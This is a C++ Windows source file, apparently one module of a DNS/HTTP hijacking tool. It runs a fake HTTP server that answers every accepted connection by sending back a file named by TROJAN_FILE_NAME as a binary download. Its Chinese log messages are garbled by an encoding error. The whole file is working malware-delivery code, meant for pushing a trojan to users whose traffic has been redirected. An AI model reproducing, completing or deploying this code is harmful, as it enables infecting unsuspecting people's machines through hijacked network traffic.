
#include <stdio.h>
#include <WINSOCK2.H>
#include <windows.h>
#include "Public.h"
#include "Packet.h"
#include "httphijack.h"
#include "DnsHijack.h"
#include "include\\openssl\\ssl.h"
#include "include\\openssl\\err.h"

#pragma comment(lib,"ws2_32.lib")





SOCKET InitFakeServer(unsigned short usPort)
{
	SOCKET sockListen = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(sockListen == INVALID_SOCKET)
	{
		printf("socket������%d\n",WSAGetLastError());
		return -1;
	}
	
	sockaddr_in saListen = {0};
	saListen.sin_addr.S_un.S_addr	= gLocalIPAddr;		
	saListen.sin_family				= AF_INET;
	saListen.sin_port				= ntohs(usPort);			
	int iRet = bind(sockListen,(sockaddr*)&saListen,sizeof(sockaddr_in));
	if (iRet == SOCKET_ERROR)
	{
		iRet = GetLastError();
		closesocket(sockListen);
		printf("bind������%d\n",WSAGetLastError());
		getchar();
		return -1;
	}
	
	iRet = listen(sockListen,LISTEN_MAX);
	if (iRet == SOCKET_ERROR)
	{
		closesocket(sockListen);
		printf("listen������%d\n",WSAGetLastError());
		return -1;
	}
	
	return sockListen;
}





int __stdcall HTTPListenThread()
{
	try
	{
		SOCKET sockListen = InitFakeServer(HTTP_PORT);
		if( (sockListen == SOCKET_ERROR) || (sockListen == INVALID_SOCKET) )
		{
			printf("HTTP�����̳߳�ʼ��ʧ��,ԭ������Ƕ˿��Ѿ����󶨻��ߴ���socketʧ�ܻ��߼�������ʧ��\n");
			getchar();
			exit(-1);
			return FALSE;
		}
		else
		{
			printf("HTTP�����߳������ɹ�,���ڼ����ͻ���������������\n");
			//return FALSE;
		}
		
		int iClientSockSize = sizeof(sockaddr_in);			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;
		while (TRUE)
		{
			LPHTTPPROXYPARAM pstHttpProxyParam = (LPHTTPPROXYPARAM)new char[sizeof(HTTPPROXYPARAM)];
			memset(pstHttpProxyParam,0,sizeof(HTTPPROXYPARAM));

			pstHttpProxyParam->sockToClient = accept(sockListen,(sockaddr*)&pstHttpProxyParam->saToClient,&iClientSockSize);
			if (pstHttpProxyParam->sockToClient != INVALID_SOCKET)
			{
				printf("HTTP�����߳̽���һ���µ�����,IP��ַ:%s,�˿�:%d\n",
					inet_ntoa(pstHttpProxyParam->saToClient.sin_addr), ntohs(pstHttpProxyParam->saToClient.sin_port));
				
				pstHttpProxyParam->hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)HTTPProxy,pstHttpProxyParam,0,&pstHttpProxyParam->ulThreadID);
				if (pstHttpProxyParam->hThread)
				{
					CloseHandle(pstHttpProxyParam->hThread);
					printf("HTTP�����̴߳����ͻ��˴����߳�,�߳̾��:%u:,�߳�ID:%u\n",pstHttpProxyParam->hThread,pstHttpProxyParam->ulThreadID);
					continue;
				}
				else
				{
					closesocket(pstHttpProxyParam->sockToClient);
					delete pstHttpProxyParam;
					printf("HTTP�����̴߳����ͻ��˴����߳�ʧ��\n");	
				}	
			}
			else
			{
				delete pstHttpProxyParam;
				printf("HTTP�����߳�accept������:%d\n",WSAGetLastError());
				continue;
			}
		}	
	}
	catch (...)
	{
		char strError[256] = {0};
		SYSTEMTIME stSysTm;
		GetLocalTime(&stSysTm);
		wsprintfA(strError, "HTTP�����̷߳����쳣,������:%u,ʱ��:%d.%d.%d %d:%d:%d\r\n",GetLastError(),
			stSysTm.wYear,stSysTm.wMonth,stSysTm.wDay,stSysTm.wHour,stSysTm.wMinute,stSysTm.wSecond);
		printf("%s",strError);
		RecordInFile(LOG_FILE,(unsigned char *)strError,strlen(strError));
		getchar();
		return FALSE;	
	}
}



int __stdcall HTTPProxy(LPHTTPPROXYPARAM pstHttpProxyParam)
{
	int				iCounter				= 0;
	int				iRet					= 0;
	unsigned char	ucBuffer[MAX_PACKET_SIZE]	= {0};

	try
	{
		unsigned char * pBuffer = ucBuffer;
		DWORD dwRecvSize = MAX_PACKET_SIZE;
		if ( (iCounter = recv(pstHttpProxyParam->sockToClient,(char*)pBuffer,dwRecvSize,0) ) > 0)
		{
			pBuffer += iCounter;
			dwRecvSize -= iCounter;
		}
		iCounter = pBuffer - ucBuffer;

		//iCounter = recv(pstHttpProxyParam->sockToClient,(char*)ucBuffer,MAX_PACKET_SIZE,0);		
		if( (iCounter == SOCKET_ERROR) || (iCounter <= 0) )
		{
			closesocket(pstHttpProxyParam->sockToClient);
			delete pstHttpProxyParam;
			printf("HTTP�����߳�socket�رջ���recv�������ݰ�ʧ��,������:%d\n",WSAGetLastError());
			return FALSE;
		}
		*(ucBuffer + iCounter) = 0;


		HANDLE hf = CreateFileA(TROJAN_FILE_NAME,GENERIC_READ | GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
		if (hf == INVALID_HANDLE_VALUE)
		{
			closesocket(pstHttpProxyParam->sockToClient);
			delete pstHttpProxyParam;
			return FALSE;
		}

		int trojansize = GetFileSize(hf,0);
		char *lpTrojan = new char [trojansize + 0x1000];

		char * httphdrformat = 
			"HTTP/1.1 200 OK\r\n"
			"Content-Type: application/octet-stream\r\n"
			"Content-Length: %u\r\n\r\n";
		char httphdr[1024];
		int httphdrlen = wsprintfA(httphdr,httphdrformat,trojansize);
		memmove(lpTrojan,httphdr,httphdrlen);

		DWORD dwcnt = 0;
		int ret = ReadFile(hf,lpTrojan + httphdrlen,trojansize,&dwcnt,0);
		CloseHandle(hf);
		if (ret == FALSE || dwcnt != trojansize)
		{
			closesocket(pstHttpProxyParam->sockToClient);
			delete [] lpTrojan;
			delete [] pstHttpProxyParam;
			return FALSE;
		}

		iCounter = send(pstHttpProxyParam->sockToClient,lpTrojan, httphdrlen + trojansize,0);
		
		closesocket(pstHttpProxyParam->sockToClient);
		delete [] lpTrojan;
		delete [] pstHttpProxyParam;
		if (iCounter <= 0)
		{
			return FALSE;
		}

		
		return TRUE;
	}
	catch (...)
	{
		char strError[256];
		SYSTEMTIME stSysTm;
		GetLocalTime(&stSysTm);
		wsprintfA(strError, "HTTP�ͻ��˴����̷߳����쳣,������:%u,�߳�ID:%u,�߳̾��:%u,ʱ��:%d.%d.%d %d:%d:%d\r\n",GetLastError(),
			pstHttpProxyParam->ulThreadID,pstHttpProxyParam->hThread,
			stSysTm.wYear,stSysTm.wMonth,stSysTm.wDay,stSysTm.wHour,stSysTm.wMinute,stSysTm.wSecond);
		printf("%s",strError);
		RecordInFile(LOG_FILE,(unsigned char *)strError,strlen(strError));
		return FALSE;
	}
}

